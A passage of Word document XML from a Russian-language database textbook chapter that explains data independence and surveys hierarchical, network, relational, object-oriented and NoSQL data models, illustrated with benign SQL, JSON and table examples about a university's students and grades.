        <w:t>7.2.4. Независимость данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Одна из главных идей трёхуровневой архитектуры — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>независимость данных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Data Independence). Это значит, что изменения на одном уровне не влияют на другие.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Логическая независимость</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Изменение концептуальной схемы (добавление/удаление таблиц, столбцов) не влияет на внешние представления (Views).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 5:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Допустим, в таблице `students` добавили столбец `phone`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ALTER TABLE students ADD COLUMN phone VARCHAR(20);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Представление `my_grades` (которое использует только `students.name`) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не сломается</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — оно продолжит работать, потому что использует только нужные ему столбцы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Можно менять структуру БД (добавлять новые таблицы, столбцы), не переписывая все приложения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Физическая независимость</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Изменение физической структуры (индексы, файловая система, оптимизация) не влияет на концептуальную схему.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 6:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Добавили индекс для ускорения поиска:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE INDEX idx_student_name ON students(name);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">SQL-запросы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не меняются</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — они как писали `SELECT * FROM students WHERE name = 'Иван'`, так и пишут. Но теперь запрос работает быстрее (благодаря индексу).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Или:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Переехали с HDD на SSD, или изменили файловую систему (с MyISAM на InnoDB). Логическая схема (таблицы, столбцы) осталась прежней.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Можно оптимизировать производительность БД (индексы, партиционирование, кэширование), не трогая логику приложений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2.5. Модели данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель данных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это способ организации данных в БД (как структурировать, как связывать).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Иерархическая модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Дерево (один родитель — много детей).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Файловая система (папки и файлы), Windows Registry, XML.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Университет</w:t>
        <w:br/>
        <w:t>├── Факультет физики</w:t>
        <w:br/>
        <w:t>│   ├── Группа Ф-101</w:t>
        <w:br/>
        <w:t>│   │   ├── Иванов Иван</w:t>
        <w:br/>
        <w:t>│   │   └── Петров Пётр</w:t>
        <w:br/>
        <w:t>│   └── Группа Ф-102</w:t>
        <w:br/>
        <w:t>│       └── Сидоров Сидор</w:t>
        <w:br/>
        <w:t>└── Факультет математики</w:t>
        <w:br/>
        <w:t xml:space="preserve">    └── Группа М-101</w:t>
        <w:br/>
        <w:t xml:space="preserve">        └── Смирнов Андрей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нельзя связать данные из разных веток (например, студент не может быть в двух группах)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложно удалять (если удалить факультет, удалятся все группы и студенты)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Использование:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Редко, в основном legacy-системы (IBM IMS).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Сетевая модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Граф (узлы могут иметь много родителей и детей).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CODASYL (стандарт 1970-х).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Студент ←→ Курс ←→ Преподаватель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Студент может быть записан на много курсов, курс могут вести несколько преподавателей, и т.д.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложная для понимания</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Много указателей (как в С с указателями — легко ошибиться)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Использование:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Устарела, почти не используется.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Реляционная модель (таблицы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Данные хранятся в таблицах (отношениях).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные понятия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Таблица (Table)** = отношение (Relation)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Строка (Row)** = запись = кортеж (Tuple)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Столбец (Column)** = атрибут (Attribute)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Первичный ключ (Primary Key, PK)** — уникальный идентификатор записи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Внешний ключ (Foreign Key, FK)** — ссылка на запись в другой таблице</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 7: Реляционная модель университета</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `students`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| id | name | email | group_id |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----|------|-------|----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | Иванов Иван | ivan@mail.ru | 1 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2 | Петров Пётр | petr@mail.ru | 1 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 3 | Сидоров Сидор | sidor@mail.ru | 2 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `groups`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| id | name | faculty |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----|------|---------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | Ф-101 | Физика |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2 | М-101 | Математика |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `courses`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| id | name | credits |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----|------|---------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | Физика 1 | 4 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2 | Математический анализ | 5 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `grades` (связь многие-ко-многим):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| student_id | course_id | score | date |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------|-----------|-------|------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 85 | 2025-01-10 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 2 | 90 | 2025-01-11 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2 | 1 | 75 | 2025-01-10 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связи:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`students.group_id` → `groups.id` (внешний ключ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`grades.student_id` → `students.id` (внешний ключ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`grades.course_id` → `courses.id` (внешний ключ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SQL-запрос:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти все оценки студента Иванова.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SELECT students.name, courses.name, grades.score</w:t>
        <w:br/>
        <w:t>FROM grades</w:t>
        <w:br/>
        <w:t>JOIN students ON grades.student_id = students.id</w:t>
        <w:br/>
        <w:t>JOIN courses ON grades.course_id = courses.id</w:t>
        <w:br/>
        <w:t>WHERE students.name = 'Иванов Иван';</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| name | name | score |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------|------|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Иванов Иван | Физика 1 | 85 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Иванов Иван | Математический анализ | 90 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества реляционной модели:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простая и понятная (таблицы как в Excel)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Математически обоснованная (реляционная алгебра)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SQL — стандартизированный язык</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Доминирующая модель (90% БД — реляционные)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для некоторых задач избыточна (например, хранение JSON-документов — лучше MongoDB)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нормализация может привести к сложным JOIN'ам (медленно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Объектно-ориентированная модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Объекты (как в ООП: классы, наследование, методы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> `db4o` (для Java, C#).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>class Student {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    String name;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int age;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    List&lt;Course&gt; courses;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Использование:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Редко (сложно, не стандартизировано).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. NoSQL (Not Only SQL)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда появились:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 2000-е годы (Google BigTable, Amazon DynamoDB).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Реляционные БД плохо масштабируются на тысячи серверов. NoSQL — это альтернатива для больших данных (Big Data), гибких схем, распределённых систем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5.1. Документоориентированные (MongoDB, CouchDB)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Коллекции документов (JSON-подобные объекты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "_id": 1,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "name": "Иванов Иван",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "email": "ivan@mail.ru",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "courses": [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    { "name": "Физика 1", "score": 85 },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    { "name": "Математический анализ", "score": 90 }</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ]</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Гибкая схема (не надо заранее задавать структуру)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Удобно для вложенных данных (JSON)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет JOIN'ов (надо денормализовывать данные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет гарантий целостности (можно записать что угодно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5.2. Ключ-значение (Redis, Memcached)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Хэш-таблица (ключ → значение).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>user:1 → {"name": "Иванов", "email": "ivan@mail.ru"}</w:t>
        <w:br/>
        <w:t>session:abc123 → {"user_id": 1, "expires": 1234567890}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Использование:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Кэширование, очереди, счётчики.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Очень быстрая (O(1) для поиска)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простая</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет запросов (только get/set по ключу)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет связей между данными</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5.3. Колоночные (Cassandra, HBase)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Данные хранятся по столбцам (а не по строкам, как в реляционных БД).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Для аналитики (выборка по столбцам) быстрее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Cassandra используют Netflix, Uber для хранения логов, событий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Горизонтальное масштабирование (тысячи серверов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Высокая доступность (нет single point of failure)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложная в настройке</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Eventual consistency (не ACID)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5.4. Графовые (Neo4j, ArangoDB)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Граф (узлы и рёбра).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Социальная сеть.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>(Иван) --[ДРУГ]--&gt; (Пётр)</w:t>
        <w:br/>
        <w:t>(Иван) --[ПОДПИСАН]--&gt; (Канал "Физика")</w:t>
        <w:br/>
        <w:t>(Пётр) --[ПОДПИСАН]--&gt; (Канал "Математика")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Использование:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Рекомендательные системы, анализ социальных сетей, логистика.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстрый поиск связей (кратчайший путь, друзья друзей)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложная для традиционных задач (CRUD)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
